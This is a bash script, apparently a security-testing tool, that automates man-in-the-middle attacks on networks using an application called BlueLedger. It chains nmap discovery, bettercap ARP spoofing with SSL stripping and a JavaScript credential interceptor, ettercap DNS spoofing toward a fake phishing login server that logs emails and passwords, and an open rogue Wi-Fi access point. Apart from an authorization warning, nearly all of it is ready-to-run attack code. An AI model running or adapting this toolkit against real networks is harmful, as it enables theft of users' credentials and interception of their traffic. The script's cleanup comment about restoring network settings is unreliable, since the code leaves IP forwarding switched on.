#!/bin/bash

# Network-based MITM Attack Script for BlueLedger Testing
# ======================================================
# This script demonstrates network-level man-in-the-middle attacks
# WARNING: Only use on networks you own or have authorization to test!

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
INTERFACE=${1:-eth0}
ATTACK_IP=$(ip route get 1 | awk '{print $7}' | head -1)
NETWORK=$(ip route | grep "$INTERFACE" | grep -E '192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.' | head -1 | awk '{print $1}')

echo -e "${BLUE}Network MITM Attack Suite for BlueLedger${NC}"
echo "========================================"
echo ""
echo "⚠️  WARNING: This tool is for authorized security testing only!"
echo "   Only use on networks you own or have explicit permission to test."
echo ""
echo "Configuration:"
echo "  Interface: $INTERFACE"
echo "  Attacker IP: $ATTACK_IP"
echo "  Target Network: $NETWORK"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Error: This script must be run as root${NC}"
    echo "Usage: sudo $0 [interface]"
    exit 1
fi

# Check for required tools
check_dependencies() {
    echo -e "${YELLOW}Checking dependencies...${NC}"
    
    local missing_tools=()
    
    if ! command -v nmap &> /dev/null; then
        missing_tools+=("nmap")
    fi
    
    if ! command -v bettercap &> /dev/null; then
        missing_tools+=("bettercap")
    fi
    
    if ! command -v ettercap &> /dev/null; then
        missing_tools+=("ettercap-text-only")
    fi
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo -e "${RED}Missing required tools: ${missing_tools[*]}${NC}"
        echo "Install with: apt install ${missing_tools[*]}"
        exit 1
    fi
    
    echo -e "${GREEN}All dependencies satisfied${NC}"
    echo ""
}

# Network discovery function
network_discovery() {
    echo -e "${YELLOW}[1] Network Discovery Phase${NC}"
    echo "Scanning network: $NETWORK"
    
    # Discover active hosts
    nmap -sn "$NETWORK" 2>/dev/null | grep "Nmap scan report" | awk '{print $5}' > /tmp/network_targets.txt
    
    local target_count=$(wc -l < /tmp/network_targets.txt)
    echo "Found $target_count active hosts:"
    
    while read -r target; do
        echo "  - $target"
    done < /tmp/network_targets.txt
    
    # Check for web servers
    echo ""
    echo "Checking for web servers on discovered hosts..."
    while read -r target; do
        if timeout 2 nc -z "$target" 80 2>/dev/null; then
            echo -e "  ${GREEN}[HTTP]${NC} $target:80"
        fi
        if timeout 2 nc -z "$target" 443 2>/dev/null; then
            echo -e "  ${GREEN}[HTTPS]${NC} $target:443"
        fi
        if timeout 2 nc -z "$target" 5000 2>/dev/null; then
            echo -e "  ${BLUE}[BlueLedger HTTP]${NC} $target:5000"
        fi
        if timeout 2 nc -z "$target" 5443 2>/dev/null; then
            echo -e "  ${BLUE}[BlueLedger HTTPS]${NC} $target:5443"
        fi
    done < /tmp/network_targets.txt
    
    echo ""
}

# ARP spoofing attack
arp_spoofing_attack() {
    echo -e "${YELLOW}[2] ARP Spoofing Attack${NC}"
    
    # Get gateway IP
    local gateway=$(ip route | grep default | awk '{print $3}' | head -1)
    echo "Gateway: $gateway"
    echo "Targets: $(cat /tmp/network_targets.txt | tr '\n' ' ')"
    
    # Create bettercap caplet for ARP spoofing
    cat > /tmp/arp_attack.cap << 'EOF'
set arp.spoof.fullduplex true
set arp.spoof.internal true
set net.probe.timeout 3

# Enable network discovery
net.probe on

# Set targets (will be replaced)
set arp.spoof.targets TARGET_NETWORK

# Enable ARP spoofing
arp.spoof on

# HTTP proxy with SSL strip
set http.proxy.sslstrip true
set http.proxy.address 0.0.0.0
set http.proxy.port 8080
set http.proxy.script /tmp/blueledger_interceptor.js
http.proxy on

# Keep running
sleep 1
clear
EOF

    # Replace placeholder with actual network
    sed -i "s/TARGET_NETWORK/$NETWORK/g" /tmp/arp_attack.cap
    
    # Create credential interceptor
    cat > /tmp/blueledger_interceptor.js << 'EOF'
function onRequest(req, res) {
    // Target BlueLedger specifically
    if (req.hostname.includes('localhost') || req.port == 5000 || req.port == 5443) {
        console.log(`[BLUELEDGER] Request from ${req.RemoteAddr}: ${req.Method} ${req.URL}`);
        
        // Force HTTP downgrade
        if (req.scheme === 'https') {
            console.log(`[DOWNGRADE] ${req.RemoteAddr}: HTTPS->HTTP attack`);
            req.scheme = 'http';
            if (req.port == 5443) {
                req.port = 5000;
            }
        }
    }
}

function onResponse(req, res) {
    // Capture login attempts
    if (req.path.includes('/auth/login') && req.method === 'POST') {
        console.log(`\n=== CREDENTIAL INTERCEPT ===`);
        console.log(`Source: ${req.RemoteAddr}`);
        console.log(`Time: ${new Date().toISOString()}`);
        console.log(`User-Agent: ${req.headers['User-Agent']}`);
        console.log(`Body: ${req.body}`);
        console.log(`============================\n`);
        
        // Log to file
        var fs = require('fs');
        var logData = {
            timestamp: new Date().toISOString(),
            source_ip: req.RemoteAddr,
            user_agent: req.headers['User-Agent'],
            credentials: req.body,
            url: req.url
        };
        
        try {
            fs.appendFileSync('/tmp/intercepted_credentials.log', JSON.stringify(logData) + '\n');
        } catch(e) {
            console.log('Failed to write to log:', e);
        }
    }
}
EOF

    echo "Starting ARP spoofing attack..."
    echo "Logs will be written to: /tmp/intercepted_credentials.log"
    echo ""
    echo -e "${GREEN}Attack is starting...${NC}"
    echo "Press Ctrl+C to stop the attack"
    echo ""
    
    # Start bettercap with our caplet
    bettercap -iface "$INTERFACE" -caplet /tmp/arp_attack.cap
}

# DNS spoofing attack
dns_spoofing_attack() {
    echo -e "${YELLOW}[3] DNS Spoofing Attack${NC}"
    
    # Create DNS spoofing hosts file
    cat > /tmp/etter.dns << EOF
# DNS spoofing for BlueLedger
localhost             A   $ATTACK_IP
blueledger.local      A   $ATTACK_IP
*.blueledger.local    A   $ATTACK_IP
blueledger.com        A   $ATTACK_IP
*.blueledger.com      A   $ATTACK_IP
EOF
    
    echo "DNS spoofing configuration:"
    cat /tmp/etter.dns
    echo ""
    
    # Create credential capture server
    cat > /tmp/fake_server.py << 'EOF'
#!/usr/bin/env python3
import http.server
import socketserver
import json
from datetime import datetime
from urllib.parse import parse_qs

class CredentialCapture(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve fake login page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        fake_page = """<!DOCTYPE html>
<html>
<head>
    <title>BlueLedger - Authentication</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 50px; }
        .login-box { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>BlueLedger Corporate Portal</h2>
        <form method="POST" action="/api/auth/login">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <p><small>Secure corporate access portal</small></p>
    </div>
</body>
</html>"""
        self.wfile.write(fake_page.encode())
    
    def do_POST(self):
        if '/api/auth/login' in self.path:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            
            # Parse form data
            parsed_data = parse_qs(post_data)
            
            # Log credentials
            capture_data = {
                'timestamp': datetime.now().isoformat(),
                'source_ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'credentials': parsed_data,
                'raw_post': post_data
            }
            
            print(f"\n🚨 CREDENTIAL CAPTURE 🚨")
            print(f"Source: {capture_data['source_ip']}")
            print(f"Email: {parsed_data.get('email', [''])[0]}")
            print(f"Password: {parsed_data.get('password', [''])[0]}")
            print(f"User-Agent: {capture_data['user_agent']}")
            print("=" * 50)
            
            # Save to file
            with open('/tmp/dns_spoof_captures.log', 'a') as f:
                f.write(json.dumps(capture_data) + '\n')
            
            # Redirect to avoid suspicion
            self.send_response(302)
            self.send_header('Location', 'https://google.com')
            self.end_headers()

if __name__ == '__main__':
    PORT = 80
    Handler = CredentialCapture
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Fake server running on port {PORT}")
        httpd.serve_forever()
EOF
    
    # Start fake server in background
    echo "Starting fake BlueLedger server on port 80..."
    python3 /tmp/fake_server.py &
    FAKE_SERVER_PID=$!
    sleep 2
    
    echo -e "${GREEN}Fake server started (PID: $FAKE_SERVER_PID)${NC}"
    echo ""
    
    # Get gateway
    local gateway=$(ip route | grep default | awk '{print $3}' | head -1)
    
    echo "Starting DNS spoofing with ettercap..."
    echo "Gateway: $gateway"
    echo "Target network: $NETWORK"
    echo ""
    echo "Press Ctrl+C to stop the attack"
    
    # Cleanup function
    cleanup() {
        echo ""
        echo "Stopping attack..."
        kill $FAKE_SERVER_PID 2>/dev/null
        exit 0
    }
    trap cleanup INT
    
    # Start ettercap with DNS spoofing
    ettercap -T -M arp:remote -P dns_spoof /"$gateway"// /"$NETWORK"// &
    ETTERCAP_PID=$!
    
    # Monitor logs
    echo "Monitoring captured credentials..."
    tail -f /tmp/dns_spoof_captures.log
}

# WiFi attack setup
wifi_attack_setup() {
    echo -e "${YELLOW}[4] WiFi-based Attack Setup${NC}"
    
    # Check for wireless interface
    local wifi_interface=$(iw dev | grep Interface | awk '{print $2}' | head -1)
    
    if [ -z "$wifi_interface" ]; then
        echo -e "${RED}No wireless interface found${NC}"
        return 1
    fi
    
    echo "Found wireless interface: $wifi_interface"
    
    # Create fake AP configuration
    cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=BlueLedger-Corporate
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF
    
    # DHCP configuration
    cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
address=/blueledger.local/192.168.100.1
address=/blueledger.com/192.168.100.1
address=/#/192.168.100.1
EOF
    
    echo "Created fake AP configuration:"
    echo "  SSID: BlueLedger-Corporate"
    echo "  Channel: 6"
    echo "  Network: 192.168.100.0/24"
    echo ""
    echo "To launch the attack:"
    echo "  1. sudo systemctl stop network-manager"
    echo "  2. sudo ip link set dev $wifi_interface up"
    echo "  3. sudo ip addr add 192.168.100.1/24 dev $wifi_interface"
    echo "  4. sudo hostapd /tmp/hostapd.conf &"
    echo "  5. sudo dnsmasq -C /tmp/dnsmasq.conf &"
    echo "  6. python3 /tmp/fake_server.py"
    echo ""
}

# Complete attack scenario
full_attack_scenario() {
    echo -e "${YELLOW}[5] Complete Attack Scenario${NC}"
    echo "This will launch a coordinated attack using multiple techniques"
    echo ""
    
    read -p "Are you sure you want to proceed? (y/N): " -n 1 -r
    echo ""
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo "Attack cancelled"
        return 0
    fi
    
    echo "Launching coordinated attack..."
    
    # Start fake server
    echo "Starting credential capture server..."
    python3 /tmp/fake_server.py &
    FAKE_SERVER_PID=$!
    
    # Start network discovery
    network_discovery
    
    # Start ARP spoofing
    echo "Starting ARP spoofing in background..."
    bettercap -iface "$INTERFACE" -caplet /tmp/arp_attack.cap &
    BETTERCAP_PID=$!
    
    # Start DNS spoofing
    echo "Starting DNS spoofing..."
    local gateway=$(ip route | grep default | awk '{print $3}' | head -1)
    ettercap -T -M arp:remote -P dns_spoof /"$gateway"// /"$NETWORK"// &
    ETTERCAP_PID=$!
    
    echo ""
    echo -e "${GREEN}Full attack is now active!${NC}"
    echo "Monitoring all capture logs..."
    echo "Press Ctrl+C to stop all attacks"
    
    # Cleanup function
    cleanup_full() {
        echo ""
        echo "Stopping all attack processes..."
        kill $FAKE_SERVER_PID $BETTERCAP_PID $ETTERCAP_PID 2>/dev/null
        
        # Restore network settings
        echo "1" > /proc/sys/net/ipv4/ip_forward
        
        echo "Attack stopped"
        exit 0
    }
    trap cleanup_full INT
    
    # Monitor all log files
    tail -f /tmp/intercepted_credentials.log /tmp/dns_spoof_captures.log 2>/dev/null
}

# Main menu
show_menu() {
    echo "Select attack type:"
    echo "  1) Network Discovery Only"
    echo "  2) ARP Spoofing Attack"
    echo "  3) DNS Spoofing Attack" 
    echo "  4) WiFi Attack Setup"
    echo "  5) Full Attack Scenario"
    echo "  6) Exit"
    echo ""
    read -p "Choice [1-6]: " choice
    
    case $choice in
        1) network_discovery ;;
        2) check_dependencies && network_discovery && arp_spoofing_attack ;;
        3) check_dependencies && network_discovery && dns_spoofing_attack ;;
        4) wifi_attack_setup ;;
        5) check_dependencies && full_attack_scenario ;;
        6) echo "Exiting..."; exit 0 ;;
        *) echo -e "${RED}Invalid choice${NC}"; show_menu ;;
    esac
}

# Verify network configuration
if [ -z "$NETWORK" ]; then
    echo -e "${RED}Could not determine network range${NC}"
    echo "Please specify interface: $0 <interface>"
    exit 1
fi

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Show menu
show_menu